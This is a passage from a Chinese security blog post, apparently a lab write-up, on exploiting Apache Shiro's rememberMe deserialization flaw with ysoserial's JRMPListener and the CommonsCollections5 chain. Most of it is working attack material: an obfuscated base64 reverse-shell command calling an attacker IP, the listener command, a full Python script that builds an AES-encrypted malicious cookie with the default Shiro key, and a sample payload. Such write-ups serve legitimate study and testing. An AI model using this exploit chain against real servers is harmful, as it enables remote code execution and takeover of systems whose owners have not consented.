+<p>先制作一个反弹shell的payload：<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX’s Blog</a></p>
+<pre><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC8yMTEgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;
+</code></pre>
+<p>利用序列化工具<code>ysoserial.jar</code>生成payload:</p>
+<pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC8yMTEgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;
+</code></pre>
+<blockquote>
+<p> 对这段命令做个简要的解释：这里我们相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定 CommonsCollections5 利用链生成可执行bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.131&#x2F;6666 0&gt;&amp;1命令的序列化数据payload1。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload1。</p>
+<p>至于为什么是CommonsCollections5 ，这是因为靶场的 shiro 存在 commons-collections 3.2.1 依赖， 是一个版本问题，这里就不细究源代码了。</p>
+</blockquote>
+<p>让存在漏洞的页面去请求我们攻击机的VPS服务</p>
+<p>生成<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=AES%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">AES加密</a>&#x3D;&gt;Base64编码后的rememberMe字段:<code>python2</code></p>
+<pre><code class="python2">import sys
+import uuid
+import base64
+import subprocess
+from Crypto.Cipher import AES
+def encode_rememberme(command):
+    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    file_body = pad(popen.stdout.read())
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+ 
+if __name__ == &#39;__main__&#39;:
+    payload = encode_rememberme(sys.argv[1])   
+print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())
+</code></pre>
+<blockquote>
+<p>代码中key &#x3D; base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”)这一行括号内即为AES加密的密钥，如果密钥是其他的，在这里就填写其他的密钥。脚本运行的命令如下（读者应当更改为攻击机ip:JRMP监听的端口号），注意shiro.py的位置应当保证和ysoserial.jar在同一目录下</p>
+</blockquote>
+<pre><code>python2 shiro.py &#123;vps:port&#125;
+</code></pre>
+<p>这里又要使用pycryptodome包，把脚本改一下用python3运行，（幸好不长，只有个别地方调整一下就行）</p>
+<pre><code>rememberMe=4PtwVRwjQ5O1yaDZDv9ORjOCkcGcMpNY/Uh1CRNJqhPF/wWliNnicOdQ6aIewAxwdmIiMS76Io5MjRgIsj0XcENTG0Kaibo/tnj489lfLifaFrVtDxxLxrsUwkHhj3vUECZ17AyAblEofyK8jI4Lmg9qwSiyxapcxtOoLaGMKa6244+LOMzCnB+TSKkACjoqxCELpQyvyasQxPoNPNKoiRIiYXwk2t+ZFVbLL4zPocQYlxgugAUFgCYTeMP33xgyEicKgHdFmF5fNMV3cY1ODNi0ApVJ2XTbG4muwLHLawxAUEz691T/llGaMfy8gFFwamHCZ21EaNqcO1Kq6mhQNKLELyMIYt9j0OxPJW2veHDdm4oXp5ouMuNnHvENt4dvCMz6aJEbYVCbx3g5qMAjoA==
+</code></pre>
+<p>整：</p>
+<p><img src="/img/image-20241115163314746.png" alt="image-20241115163314746"></p>
+<p>这里需要注意是在cookie后添加这段代码，而不是修改post body里的<code>remember me</code>字段</p>
+<p> 看到返回的包里有<code>deleteMe</code>基本上就成功了</p>
+<p>博主贴心地给了个总结：</p>
+<blockquote>
+<p>攻击过程复盘<br> 对于攻击者而言，核心就是干了两件事：</p>
+<p>1.搭建VPS进行JRMPListener，存放反弹shell的payload1</p>
+<p>2.将上述VPS进行JRMPListener的地址进行了AES加密和base64编码，构造请求包cookie中的rememberMe字段，向存在漏洞的服务器发送加密编码后的结果payload2。</p>
+<p>那么对于靶机服务器，他是怎么沦陷的呢？</p>
+<p>1.接收到请求包payload2，对他进行base64解码&#x3D;&gt;AES解密，发现要和一个VPS的JRMP 7777端口进行通信。</p>
+<p>2.向恶意站点VPS的JRMP 7777进行请求，接收到了到了序列化后的恶意代码（反弹shell到攻击机的6666端口）payload1。</p>
+<p>3.对payload1执行了反序列化，执行了反弹shell的恶意命令，就此沦陷。</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/130173880">https://blog.csdn.net/Bossfrank/article/details/130173880</a></p>
+</blockquote>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/11/12/Vulhub-Frame/" title="Vulhub_Frame"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Vulhub_Frame</span></a><a class="button is-default" href="/2024/10/28/HTB-CICADA/" title="HTB_CICADA"><span class="has-text-weight-semibold">Next: HTB_CICADA</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
